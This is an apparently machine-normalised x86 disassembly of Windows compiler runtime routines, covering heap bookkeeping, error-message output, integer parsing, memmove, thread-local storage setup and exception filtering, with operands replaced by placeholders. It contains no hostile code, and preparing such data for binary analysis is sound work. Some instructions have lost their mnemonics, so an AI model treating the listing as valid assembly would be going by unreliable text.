jne r-xdata
test ecx ecx
jge r-xdata
mov ecx [ eax + edx * 4 + 0xc4 ]
and ecx [ ebp - 0x8 ]
push 0x20
pop edi
jmp r-xdata
mov edi [ ecx ]
and edx [ ebp - 0x8 ]
and edi esi
or edx edi
jne r-xdata
add ebx 0x14
jmp r-xdata
add ecx ecx
inc edi
mov ecx [ ebp - 0xc ]
mov edx [ ecx + edi * 8 + 0x4 ]
mov ecx [ edx ]
sub ecx [ ebp - 0x10 ]
mov esi ecx
sar esi 0x4
dec esi
cmp esi 0x3f
mov [ ebp - 0x8 ] ecx
jle r-xdata
cmp ebx eax
jb r-xdata
cmp esi edi
je r-xdata
push 0x3f
pop esi
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
cmp ebx eax
jne r-xdata
test ecx ecx
je r-xdata
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
add ebx 0x14
mov [ ebp + 0x8 ] ebx
push ebx
call sub_414664
pop ecx
mov ecx [ ebx + 0x10 ]
mov [ ecx ] eax
mov eax [ ebx + 0x10 ]
cmp [ eax ] 0xffffffff
je r-xdata
mov ebx [ rw-data ]
jmp r-xdata
mov esi [ ebp - 0x10 ]
add edx ecx
lea ecx [ esi + 0x1 ]
mov [ edx ] ecx
mov [ edx + esi - 0x4 ] ecx
mov esi [ ebp - 0xc ]
mov ecx [ esi ]
test ecx ecx
lea edi [ ecx + 0x1 ]
mov [ esi ] edi
jne r-xdata
mov [ edx ] ecx
mov [ ecx + edx - 0x4 ] ecx
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
mov ecx [ edx + 0x8 ]
mov edi [ edx + 0x4 ]
mov [ ecx + 0x4 ] edi
mov ecx [ edx + 0x4 ]
mov edi [ edx + 0x8 ]
mov [ ecx + 0x8 ] edi
je r-xdata
cmp edi 0x20
mov ebx 0x80000000
jge r-xdata
xor eax eax
jmp r-xdata
cmp ebx ecx
mov [ ebp + 0x8 ] ebx
jb r-xdata
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
lea eax [ edx + 0x4 ]
cmp ebx [ rw-data ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
lea ecx [ ecx + esi * 8 ]
mov edi [ ecx + 0x4 ]
mov [ edx + 0x8 ] ecx
mov [ edx + 0x4 ] edi
mov [ ecx + 0x4 ] edx
mov ecx [ edx + 0x4 ]
mov [ ecx + 0x8 ] edx
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
lea ecx [ edi - 0x20 ]
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea ecx [ eax + ecx * 4 + 0xc4 ]
lea edi [ eax + edi + 0x4 ]
not ebx
and [ ecx ] ebx
dec [ edi ]
mov [ ebp - 0x14 ] ebx
jne r-xdata
mov ecx edi
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea edi [ eax + edi + 0x4 ]
not ebx
mov [ ebp - 0x14 ] ebx
and ebx [ eax + ecx * 4 + 0x44 ]
mov [ eax + ecx * 4 + 0x44 ] ebx
dec [ edi ]
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
cmp ebx ecx
jne r-xdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ rw-data ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov cl [ esi + eax + 0x4 ]
mov [ ebp + 0xb ] cl
inc cl
cmp esi 0x20
mov [ esi + eax + 0x4 ] cl
jge r-xdata
mov ebx [ ebp + 0x8 ]
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
and [ ebx + 0x4 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov ebx [ ebp + 0x8 ]
and [ ebx ] ecx
jmp r-xdata
add ebx 0x14
call sub_4145b4
mov ebx eax
test ebx ebx
mov [ ebp + 0x8 ] ebx
jne r-xdata
and [ rw-data ] 0x0
cmp [ ebp + 0xb ] 0x0
jne r-xdata
cmp [ ebp + 0xb ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
lea edi [ eax + ecx * 4 + 0xc4 ]
lea ecx [ esi - 0x20 ]
mov esi 0x80000000
shr esi cl
or [ edi ] esi
lea ecx [ esi - 0x20 ]
mov edi 0x80000000
shr edi cl
or [ ebx + 0x4 ] edi
mov ecx esi
mov edi 0x80000000
shr edi cl
mov ecx [ ebp - 0x4 ]
or [ eax + ecx * 4 + 0x44 ] edi
jmp r-xdata
mov edi 0x80000000
mov ecx esi
shr edi cl
or [ ebx ] edi
sub_414d36
push [ rw-data ]
call sub_415561
test eax eax
pop ecx
je r-xdata
xor eax eax
retn
push [ esp + 0x4 ]
call eax
test eax eax
pop ecx
je r-xdata
xor eax eax
inc eax
retn
sub_414d58
push ecx
push ebx
mov ebx [ esp + 0xc ]
push esi
push edi
xor esi esi
xor edi edi
cmp edi 0x17
jae r-xdata
inc edi
cmp edi 0x17
jl r-xdata
pop edi
pop esi
pop ebx
pop ecx
retn
push ebp
push 0x3
call sub_41bb03
cmp eax 0x1
pop ecx
je r-xdata
cmp ebx [ edi * 8 + rw-data ]
je r-xdata
push 0xfffffff4
call [ GetStdHandle@IAT ]
mov ebp eax
cmp ebp esi
je r-xdata
push 0x3
call sub_41bb03
test eax eax
pop ecx
jne r-xdata
pop ebp
cmp ebp 0xffffffff
je r-xdata
cmp ebx 0xfc
je r-xdata
cmp [ rw-data ] 0x1
je r-xdata
push 0x0
lea eax [ esp + 0x14 ]
push eax
lea esi [ edi * 8 + rw-data ]
push [ esi ]
call sub_4108e0
pop ecx
push eax
push [ esi ]
push ebp
call [ WriteFile@IAT ]
push r--data
mov ebx 0x314
push ebx
mov ebp rw-data
push ebp
call sub_410677
add esp 0xc
test eax eax
je r-xdata
push 0x104
mov esi rw-data
push esi
push 0x0
mov [ rw-data ] 0x0
call [ GetModuleFileNameA@IAT ]
test eax eax
jne r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_413eb1
add esp 0x14
push esi
call sub_4108e0
inc eax
cmp eax 0x3c
pop ecx
jbe r-xdata
push r--data
push 0x2fb
push esi
call sub_410677
add esp 0xc
test eax eax
je r-xdata
xor esi esi
push esi
call sub_4108e0
sub esi 0x3b
add eax esi
push 0x3
mov ecx rw-data
push r--data
sub ecx eax
push ecx
push eax
call sub_412d19
add esp 0x14
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_413eb1
add esp 0x14
push [ edi * 8 + rw-data ]
push ebx
push ebp
call sub_41120a
add esp 0xc
test eax eax
je r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_413eb1
add esp 0x14
xor esi esi
push esi
push esi
push esi
push esi
push esi
call sub_413eb1
add esp 0x14
jmp r-xdata
push 0x12010
push r--data
push ebp
call sub_41b965
add esp 0xc
jmp r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_413eb1
add esp 0x14
push r--data
push ebx
push ebp
call sub_41120a
add esp 0xc
test eax eax
je r-xdata
sub_414ef8
push 0x3
call sub_41bb03
cmp eax 0x1
pop ecx
je r-xdata
push 0xfc
call sub_414d58
push 0xff
call sub_414d58
pop ecx
pop ecx
push 0x3
call sub_41bb03
test eax eax
pop ecx
jne r-xdata
retn
cmp [ rw-data ] 0x1
jne r-xdata
sub_414f31
push ebp
mov ebp esp
sub esp 0x14
push esi
push edi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x14 ]
call sub_4110bb
mov eax [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
xor edi edi
cmp eax edi
je r-xdata
cmp esi edi
jne r-xdata
mov [ eax ] esi
cmp [ ebp + 0x14 ] edi
je r-xdata
call sub_411077
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_413fad
add esp 0x14
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov ecx [ ebp - 0x14 ]
push ebx
mov bl [ esi ]
mov [ ebp - 0x4 ] edi
lea edi [ esi + 0x1 ]
cmp [ ebp + 0x14 ] 0x2
jl r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
mov edx [ ecx + 0xc8 ]
movzx eax bl
movzx eax [ edx + eax * 2 ]
and eax 0x8
lea eax [ ebp - 0x14 ]
push eax
movzx eax bl
push 0x8
push eax
call sub_41bb49
mov ecx [ ebp - 0x14 ]
add esp 0xc
jmp r-xdata
cmp [ ebp + 0x14 ] 0x24
jg r-xdata
pop edi
pop esi
leave
retn
cmp bl 0x2d
jne r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
test eax eax
je r-xdata
cmp bl 0x2b
jne r-xdata
or [ ebp + 0x18 ] 0x2
jmp r-xdata
cmp [ ecx + 0xac ] 0x1
jle r-xdata
mov eax [ ebp + 0x14 ]
test eax eax
jl r-xdata
mov bl [ edi ]
inc edi
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
cmp eax 0x1
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov [ eax ] esi
cmp eax 0x24
jg r-xdata
xor eax eax
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
test eax eax
jne r-xdata
cmp eax 0x10
jne r-xdata
cmp bl 0x30
je r-xdata
mov esi [ ecx + 0xc8 ]
or eax 0xffffffff
xor edx edx
div [ ebp + 0x14 ]
cmp bl 0x30
jne r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] 0xa
jmp r-xdata
test cx 0x103
je r-xdata
movsx ecx bl
sub ecx 0x30
jmp r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] 0x10
jmp r-xdata
cmp al 0x58
je r-xdata
mov eax [ ebp + 0x18 ]
dec edi
test al 0x8
jne r-xdata
mov cl bl
sub cl 0x61
cmp cl 0x19
movsx ecx bl
ja r-xdata
cmp ecx [ ebp + 0x14 ]
jae r-xdata
inc edi
mov bl [ edi ]
inc edi
cmp al 0x58
jne r-xdata
mov [ ebp + 0x14 ] 0x8
jmp r-xdata
test al 0x4
mov esi 0x7fffffff
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
add ecx 0xffffffc9
sub ecx 0x20
or [ ebp + 0x18 ] 0x8
cmp [ ebp - 0x4 ] eax
jb r-xdata
call sub_411077
test [ ebp + 0x18 ] 0x1
mov [ eax ] 0x22
je r-xdata
test al 0x1
jne r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov edi [ ebp + 0xc ]
mov ebx [ ebp - 0x4 ]
imul ebx [ ebp + 0x14 ]
add ebx ecx
mov [ ebp - 0x4 ] ebx
jne r-xdata
mov al [ ebp + 0x18 ]
and al 0x2
neg al
sbb eax eax
neg eax
add eax esi
mov [ ebp - 0x4 ] eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
and eax 0x2
je r-xdata
movzx ecx bl
movzx ecx [ esi + ecx * 2 ]
test cl 0x4
je r-xdata
or [ ebp + 0x18 ] 0x4
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp ecx edx
jbe r-xdata
test [ ebp + 0x18 ] 0x2
je r-xdata
mov [ eax ] edi
test eax eax
jne r-xdata
cmp [ ebp - 0x4 ] 0x80000000
ja r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
neg [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] esi
jbe r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
sub_41515c
push ebp
mov ebp esp
xor eax eax
cmp [ rw-data ] eax
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
jne r-xdata
push eax
push rw-data
jmp r-xdata
call sub_414f31
add esp 0x14
pop ebp
retn
sub_415190
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x100
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_415218 ]
jmp [ ecx * 4 + jump_table_415298 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_415304 ]
pop esi
pop edi
pop ebp
jmp sub_41bc86
jmp [ ecx * 4 + jump_table_4154a0 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_4153a4 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4154a0 ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_415304 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_4154a0 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_415304 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_415304 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_415304 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4154a0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4154a0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4154a0 ]
sub_4154f5
push esi
push [ rw-data ]
mov esi [ TlsGetValue@IAT ]
call esi
test eax eax
je r-xdata
push r--data
call [ GetModuleHandleA@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
mov eax [ esp + 0x8 ]
pop esi
retn
push r--data
push eax
call [ GetProcAddress@IAT ]
push eax
push [ rw-data ]
call esi
call eax
test eax eax
je r-xdata
push [ esp + 0x8 ]
call eax
mov [ esp + 0x8 ] eax
mov eax [ eax + 0x1f8 ]
jmp r-xdata
test eax eax
je r-xdata
sub_415561
push esi
push [ rw-data ]
mov esi [ TlsGetValue@IAT ]
call esi
test eax eax
je r-xdata
push r--data
call [ GetModuleHandleA@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
mov eax [ esp + 0x8 ]
pop esi
retn
push r--data
push eax
call [ GetProcAddress@IAT ]
push eax
push [ rw-data ]
call esi
call eax
test eax eax
je r-xdata
push [ esp + 0x8 ]
call eax
mov [ esp + 0x8 ] eax
mov eax [ eax + 0x1fc ]
jmp r-xdata
test eax eax
je r-xdata
sub_4155f7
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push eax
push [ rw-data ]
call sub_415561
pop ecx
call eax
or [ rw-data ] 0xffffffff
jmp sub_4140cf
push eax
call [ TlsFree@IAT ]
or [ rw-data ] 0xffffffff
sub_415634
push 0xc
push r--data
call sub_4106dc
push r--data
call [ GetModuleHandleA@IAT ]
mov [ ebp - 0x1c ] eax
mov esi [ ebp + 0x8 ]
mov [ esi + 0x5c ] rw-data
xor edi edi
inc edi
mov [ esi + 0x14 ] edi
test eax eax
je r-xdata
mov [ esi + 0x70 ] edi
mov [ esi + 0xc8 ] 0x43
mov [ esi + 0x14b ] 0x43
mov eax rw-data
mov [ esi + 0x68 ] eax
push eax
call [ InterlockedIncrement@IAT ]
push 0xc
call sub_4141fc
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0xc ]
mov [ esi + 0x6c ] eax
test eax eax
jne r-xdata
push r--data
push eax
mov ebx [ GetProcAddress@IAT ]
call ebx
mov [ esi + 0x1f8 ] eax
push r--data
push [ ebp - 0x1c ]
call ebx
mov [ esi + 0x1fc ] eax
push [ esi + 0x6c ]
call sub_4199a1
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4156df
call sub_410721
retn
mov eax [ rw-data ]
mov [ esi + 0x6c ] eax
sub_4156e8
push esi
push edi
call [ GetLastError@IAT ]
mov edi eax
call sub_4155cd
push [ rw-data ]
push [ rw-data ]
call [ TlsGetValue@IAT ]
call eax
mov esi eax
test esi esi
jne r-xdata
push edi
call [ SetLastError@IAT ]
pop edi
mov eax esi
pop esi
retn
push 0x214
push 0x1
call sub_4174d9
mov esi eax
test esi esi
pop ecx
pop ecx
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call sub_415561
pop ecx
call eax
test eax eax
je r-xdata
push esi
call sub_40f613
pop ecx
xor esi esi
push 0x0
push esi
call sub_415634
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
jmp r-xdata
sub_415783
push 0x8
push r--data
call sub_4106dc
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_410721
retn 0x4
mov eax [ esi + 0x24 ]
test eax eax
je r-xdata
mov eax [ esi + 0x2c ]
test eax eax
je r-xdata
push eax
call sub_40f613
pop ecx
mov eax [ esi + 0x34 ]
test eax eax
je r-xdata
push eax
call sub_40f613
pop ecx
mov eax [ esi + 0x3c ]
test eax eax
je r-xdata
push eax
call sub_40f613
pop ecx
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
push eax
call sub_40f613
pop ecx
mov eax [ esi + 0x48 ]
test eax eax
je r-xdata
push eax
call sub_40f613
pop ecx
mov eax [ esi + 0x5c ]
cmp eax rw-data
je r-xdata
push eax
call sub_40f613
pop ecx
push 0xd
call sub_4141fc
pop ecx
and [ ebp - 0x4 ] 0x0
mov edi [ esi + 0x68 ]
test edi edi
je r-xdata
push eax
call sub_40f613
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41588f
push 0xc
call sub_4141fc
pop ecx
mov [ ebp - 0x4 ] 0x1
mov edi [ esi + 0x6c ]
test edi edi
je r-xdata
push edi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41589b
push esi
call sub_40f613
pop ecx
push edi
call sub_419a27
pop ecx
cmp edi [ rw-data ]
je r-xdata
cmp edi rw-data
je r-xdata
cmp edi rw-data
je r-xdata
push edi
call sub_40f613
pop ecx
cmp [ edi ] 0x0
jne r-xdata
push edi
call sub_419861
pop ecx
sub_4158a4
push edi
push r--data
call [ GetModuleHandleA@IAT ]
mov edi eax
test edi edi
jne r-xdata
push esi
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
cmp [ rw-data ] 0x0
mov esi [ TlsSetValue@IAT ]
mov [ rw-data ] eax
je r-xdata
call sub_4155f7
xor eax eax
pop edi
retn
mov eax [ TlsGetValue@IAT ]
mov [ rw-data ] eax
mov eax [ TlsFree@IAT ]
mov [ rw-data ] sub_4155c4
mov [ rw-data ] esi
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
push [ rw-data ]
push eax
call esi
test eax eax
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_413229
push [ rw-data ]
call sub_4154f5
push [ rw-data ]
mov [ rw-data ] eax
call sub_4154f5
push [ rw-data ]
mov [ rw-data ] eax
call sub_4154f5
push [ rw-data ]
mov [ rw-data ] eax
call sub_4154f5
add esp 0x10
mov [ rw-data ] eax
call sub_414086
test eax eax
je r-xdata
test eax eax
jne r-xdata
call sub_4155f7
push sub_415783
push [ rw-data ]
call sub_415561
pop ecx
call eax
cmp eax 0xffffffff
mov [ rw-data ] eax
je r-xdata
call [ TlsAlloc@IAT ]
cmp eax 0xffffffff
mov [ rw-data ] eax
je r-xdata
push 0x214
push 0x1
call sub_4174d9
mov esi eax
test esi esi
pop ecx
pop ecx
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call sub_415561
pop ecx
call eax
test eax eax
je r-xdata
push 0x0
push esi
call sub_415634
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
xor eax eax
inc eax
jmp r-xdata
pop esi
pop edi
retn
sub_415a28
push 0xc
push r--data
call sub_4106dc
push 0xe
call sub_4141fc
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_415a8f
call sub_410721
retn
mov eax [ rw-data ]
mov edx rw-data
push [ esi + 0x4 ]
call sub_40f613
pop ecx
and [ esi + 0x4 ] 0x0
cmp [ eax ] ecx
jne r-xdata
mov edx eax
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov [ edx + 0x4 ] ecx
push eax
call sub_40f613
pop ecx
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
sub_415aa0
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
test edx 0x3
jne r-xdata
test edx 0x1
je r-xdata
mov eax [ edx ]
cmp al [ ecx ]
jne r-xdata
mov ax [ edx ]
add edx 0x2
cmp al [ ecx ]
jne r-xdata
mov al [ edx ]
add edx 0x1
cmp al [ ecx ]
jne r-xdata
sbb eax eax
shl eax 0x1
add eax 0x1
retn
or al al
je r-xdata
or al al
je r-xdata
add ecx 0x1
or al al
je r-xdata
xor eax eax
retn
cmp ah [ ecx + 0x1 ]
jne r-xdata
cmp ah [ ecx + 0x1 ]
jne r-xdata
test edx 0x2
je r-xdata
or ah ah
je r-xdata
or ah ah
je r-xdata
shr eax 0x10
cmp al [ ecx + 0x2 ]
jne r-xdata
add ecx 0x2
jmp r-xdata
or al al
je r-xdata
cmp ah [ ecx + 0x3 ]
jne r-xdata
add ecx 0x4
add edx 0x4
or ah ah
jne r-xdata
mov edi edi
sub_415b28
push ebp
mov ebp esp
push ecx
push ecx
push esi
call sub_4156e8
mov esi eax
test esi esi
jne r-xdata
mov edx [ esi + 0x5c ]
mov eax [ rw-data ]
push edi
mov edi [ ebp + 0x8 ]
mov ecx edx
push ebx
push [ ebp + 0xc ]
call [ UnhandledExceptionFilter@IAT ]
jmp r-xdata
imul eax eax 0xc
add eax edx
cmp ecx eax
jae r-xdata
mov ebx eax
imul ebx ebx 0xc
add ecx 0xc
add ebx edx
cmp ecx ebx
jb r-xdata
pop esi
leave
retn
xor eax eax
cmp [ ecx ] edi
jne r-xdata
cmp [ ecx ] edi
je r-xdata
push [ ebp + 0xc ]
call [ UnhandledExceptionFilter@IAT ]
jmp r-xdata
mov ebx [ eax + 0x8 ]
test ebx ebx
mov [ ebp - 0x4 ] ebx
jne r-xdata
mov eax ecx
jmp r-xdata
pop ebx
pop edi
cmp ebx 0x5
jne r-xdata
test eax eax
je r-xdata
cmp ebx 0x1
je r-xdata
and [ eax + 0x8 ] 0x0
xor eax eax
inc eax
jmp r-xdata
or eax 0xffffffff
mov ecx [ esi + 0x60 ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp + 0xc ]
mov [ esi + 0x60 ] ecx
mov ecx [ eax + 0x4 ]
cmp ecx 0x8
jne r-xdata
and [ eax + 0x8 ] 0x0
push ecx
call ebx
mov ecx [ rw-data ]
mov edi [ rw-data ]
mov edx ecx
add edi ecx
cmp edx edi
jge r-xdata
mov eax [ eax ]
cmp eax 0xc000008e
mov edi [ esi + 0x64 ]
jne r-xdata
imul ecx ecx 0xc
cmp eax 0xc0000090
jne r-xdata
mov [ esi + 0x64 ] 0x83
jmp r-xdata
mov edi [ esi + 0x5c ]
and [ ecx + edi + 0x8 ] 0x0
mov edi [ rw-data ]
mov ebx [ rw-data ]
inc edx
add ebx edi
add ecx 0xc
cmp edx ebx
jl r-xdata
mov ebx [ ebp - 0x4 ]
cmp eax 0xc0000091
jne r-xdata
mov [ esi + 0x64 ] 0x81
jmp r-xdata
push [ esi + 0x64 ]
push 0x8
call ebx
pop ecx
mov [ esi + 0x64 ] edi
jmp r-xdata
cmp eax 0xc0000093
jne r-xdata
mov [ esi + 0x64 ] 0x84
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
mov [ esi + 0x60 ] eax
cmp eax 0xc000008d
jne r-xdata
mov [ esi + 0x64 ] 0x85
jmp r-xdata
cmp eax 0xc000008f
jne r-xdata
mov [ esi + 0x64 ] 0x82
jmp r-xdata
cmp eax 0xc0000092
jne r-xdata
mov [ esi + 0x64 ] 0x86
jmp r-xdata
mov [ esi + 0x64 ] 0x8a
sub_415c97
push esi
push edi
xor edi edi
cmp [ rw-data ] edi
jne r-xdata
mov esi [ rw-data ]
test esi esi
jne r-xdata
call sub_419843
mov al [ esi ]
cmp al 0x20
ja r-xdata
mov esi r--data
cmp al 0x22
jne r-xdata
test al al
je r-xdata
movzx eax al
push eax
call sub_4129b1
test eax eax
pop ecx
je r-xdata
xor ecx ecx
test edi edi
sete cl
mov edi ecx
pop edi
mov eax esi
pop esi
retn
test edi edi
je r-xdata
inc esi
jmp r-xdata
inc esi
mov al [ esi ]
test al al
jne r-xdata
cmp al 0x20
ja r-xdata
